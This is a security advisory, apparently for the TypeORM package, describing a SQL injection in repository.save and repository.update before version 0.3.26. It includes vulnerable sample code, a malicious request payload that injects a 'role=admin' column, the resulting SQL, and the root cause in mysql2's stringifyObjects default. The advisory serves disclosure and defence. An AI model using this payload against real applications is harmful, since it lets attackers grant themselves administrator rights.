summary: "TypeORM vulnerable to SQL injection via crafted request to repository.save or repository.update\n\
  ### Summary\n\nSQL Injection vulnerability in TypeORM before 0.3.26 via crafted request to\
  \ repository.save or repository.update due to the sqlstring call using stringifyObjects default\
  \ to false.\n\n### Details\n\nVulnerable Code:\n\n```js\nconst { username, city, name} = req.body;\n\
  const updateData = {\n    username,\n    city,\n    name,\n    id:userId\n  }; // Developer\
  \ aims to only allow above three fields to be updated    \nconst result = await userRepo.save(updateData);\n\
  ```\n\nIntended Payload (non-malicious):\n\n\n`\nusername=myusername&city=Riga&name=Javad\n\
  `\n\n_OR_\n\n`{username:\\\"myusername\\\",phone:12345,name:\\\"Javad\\\"}\n`\n\nSQL query\
  \ produced:\n\n```sql\nUPDATE `user` \nSET `username` = 'myusername', \n    `city` = 'Riga',\
  \ \n    `name` = 'Javad' \nWHERE `id` IN (1);\n\n```\n\nMalicious Payload:\n\n`username=myusername&city[name]=Riga&city[role]=admin\n\
  `\n\n_OR_\n\n`{username:\\\"myusername\\\",city:{name:\\\"Javad\\\",role:\\\"admin\\\"}}\n\
  `\n\nSQL query produced with Injected Column:\n\n```sql\nUPDATE `user` \nSET `username` =\
  \ 'myusername', \n    `city` = `name` = 'Javad', \n    `role` = 'admin' \nWHERE `id` IN (1);\n\
  \n```\n_Above query is valid as `city` = `name` = `Javad` is a boolean expression resulting\
  \ in `city` = 1 (false). “role” column is injected and updated._\n\nUnderlying issue was due\
  \ to TypeORM using mysql2 [without specifying a value for the stringifyObjects option](https://github.com/typeorm/typeorm/blob/0.3.25/src/driver/mysql/MysqlConnectionOptions.ts).\
  \ In both mysql and mysql2 this [option defaults to false](https://github.com/sidorares/node-mysql2/blob/e359f454a76ba5dc31b91adf7bdb4099ca317bb5/lib/connection_config.js#L124).\
  \ This option is then passed into [SQLString library as false](https://github.com/sidorares/node-mysql2/blob/e359f454a76ba5dc31b91adf7bdb4099ca317bb5/lib/base/connection.js#L524).\
  \ This results in sqlstring [parsing objects in a strange way using objectToValues.](https://github.com/mysqljs/sqlstring/blob/cd528556b4b6bcf300c3db515026935dedf7cfa1/lib/SqlString.js#L54)"
